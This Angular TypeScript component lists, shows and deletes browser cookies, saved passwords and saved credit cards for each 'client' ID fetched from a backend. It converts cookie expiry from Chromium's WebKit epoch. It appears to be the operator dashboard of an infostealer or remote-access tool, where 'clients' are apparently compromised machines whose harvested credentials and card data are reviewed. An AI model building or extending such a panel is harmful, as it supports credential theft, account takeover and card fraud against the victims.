import { CommonModule } from '@angular/common';
import { Component, OnInit } from '@angular/core';
import { ClientService } from '../../../services/client.service';
import { ActivatedRoute, Router, RouterModule } from '@angular/router';
import { Cookie } from '../../../models/cookie.module';
import { CreditCard } from '../../../models/creditCard.module';
import { Password } from '../../../models/password.module';
import { ToastService } from '../../../../toast.service';

@Component({
  selector: 'app-browser',
  standalone: true,
  imports: [CommonModule,RouterModule],
  templateUrl: './browser.component.html',
  styleUrl: './browser.component.scss'
})
export class BrowserComponent implements OnInit {
  textareaContent:string="";

  ClientId:string|null = "";
  Cookies:Cookie[] = [];
  CreditCards:CreditCard[] = [];
  Passwords:Password[] = [];

  loading:boolean=false;

  showCookies:boolean=false;
  showCreditCard:boolean=false;
  showPasswords:boolean=false;

  modalTitle:string=""
  isModalOpen = false;
  
  onBackgroundClick(event: MouseEvent) {
    if (event.target === event.currentTarget) {
      this.isModalOpen = false;;
    }
  }

  onCloseClick() {
      this.isModalOpen = false;;
  }

  showCookie(myCookie: Cookie) {
    this.textareaContent = `Browser: ${myCookie.browser}\n`;
    this.textareaContent += `Origin: ${myCookie.origin}\n`;
    this.textareaContent += `Name: ${myCookie.name}\n`;
    this.textareaContent += `Value: ${myCookie.value}\n`;
    this.textareaContent += `Expire Date: ${this.convertCookieExpiry(myCookie.expire)}\n`;
    this.modalTitle="Cookie";
    this.isModalOpen=true;
  }
  showCard(myCard: CreditCard) {
    this.textareaContent = `Browser: ${myCard.browser}\n`;
    this.textareaContent += `Origin: ${myCard.origin}\n`;
    this.textareaContent += `Name: ${myCard.name}\n`;
    this.textareaContent += `Value: ${myCard.value}\n`;
    this.textareaContent += `Expire Date: ${myCard.expire}\n`;
    this.modalTitle="Credit Card";
    this.isModalOpen=true;
  }
  showPass(pass: Password) {
    this.textareaContent = `Browser: ${pass.browser}\n`;
    this.textareaContent += `URL: ${pass.url}\n`;
    this.textareaContent += `Login: ${pass.login}\n`;
    this.textareaContent += `Value: ${pass.value}\n`;
    this.modalTitle="Password";
    this.isModalOpen=true;
  }
  
  errorMessage:string = "";
    constructor(private clientService:ClientService,private route:ActivatedRoute,private router:Router,private toastService:ToastService){}

  ngOnInit(): void {
    this.route.paramMap.subscribe(params => {
      this.ClientId = params.get('id');
      if(this.ClientId==null){
        this.router.navigate(["/Client"]);
      }else{
        
        
      }
    });
  }
  truncate(value: string, limit: number = 25): string {
    return value.length > limit ? value.substring(0, limit) + '...' : value;
  }
  convertCookieExpiry(expiresUtc: number): Date {
    // WebKit epoch starts at January 1, 1601
    const webkitEpoch = new Date('1601-01-01T00:00:00Z').getTime();
  
    // Convert microseconds to milliseconds and add to the WebKit epoch
    const expiryDate = new Date(webkitEpoch + (expiresUtc / 1000));
  
    return expiryDate;
  }
  DeleteAllCreditCard(){
    if(this.ClientId!=null){
      const deleteAllSCRReq = this.clientService.deleteClientCreditCards(this.ClientId);
      if(deleteAllSCRReq!=null){
        deleteAllSCRReq.subscribe(
          (response: any) => {
            this.toastService.showToast("Opeartion Has Been Done Successfully !")
            this.DisplayCreditCards();
          },
          (error) => {
            
          }
        );
      }
    }
  }
  DeleteAllPasswords(){
    if(this.ClientId!=null){
      const deleteAllSCRReq = this.clientService.deleteClientPasswords(this.ClientId);
      if(deleteAllSCRReq!=null){
        deleteAllSCRReq.subscribe(
          (response: any) => {
            this.toastService.showToast("Opeartion Has Been Done Successfully !")
            this.DisplayPasswords();
          },
          (error) => {
            
          }
        );
      }
    }
  }
  DeleteAllCokies(){
    if(this.ClientId!=null){
      const deleteAllSCRReq = this.clientService.deleteClientCookies(this.ClientId);
      if(deleteAllSCRReq!=null){
        deleteAllSCRReq.subscribe(
          (response: any) => {
            this.toastService.showToast("Opeartion Has Been Done Successfully !")
            this.DisplayCookies();
          },
          (error) => {
            
          }
        );
      }
    }
  }
  DisplayCookies(){
    this.errorMessage="";
    this.loading=true;
    this.showCookies=true;
    this.showCreditCard=false;
    this.showPasswords=false;
    if(this.ClientId!=null){
      const clientCoookiesRequest=this.clientService.getClientCookies(this.ClientId);
      if(clientCoookiesRequest!=null){
        clientCoookiesRequest.subscribe((response)=>{
          this.Cookies=response;
        },(error)=>{
          if(error.status==404){
             this.router.navigate(["/Client"]);
          }else{
            this.errorMessage="Something Wrong Happened";
          }
        })
      }
    }
    this.loading=false;
  }
  
  DisplayCreditCards(){
    this.errorMessage="";
    this.loading=true;
    this.showCookies=false;
    this.showCreditCard=true; // --
    this.showPasswords=false;
    if(this.ClientId!=null){
      const clientCoookiesRequest=this.clientService.getClientCreditCards(this.ClientId);
      if(clientCoookiesRequest!=null){
        clientCoookiesRequest.subscribe((response)=>{
          this.CreditCards=response;
        },(error)=>{
          if(error.status==404){
             this.router.navigate(["/Client"]);
          }else{
            this.errorMessage="Something Wrong Happened";
          }
        })
      }
    }
    this.loading=false;
  }
  DisplayPasswords(){
    this.errorMessage="";
    this.loading=true;
    this.showCookies=false;
    this.showCreditCard=false;
    this.showPasswords=true;
    if(this.ClientId!=null){
      const clientCoookiesRequest=this.clientService.getClientPasswords(this.ClientId);
      if(clientCoookiesRequest!=null){
        clientCoookiesRequest.subscribe((response)=>{
          this.Passwords=response;
        },(error)=>{
          if(error.status==404){
             this.router.navigate(["/Client"]);
          }else{
            this.errorMessage="Something Wrong Happened";
          }
        })
      }
    }
    this.loading=false;
  }
}
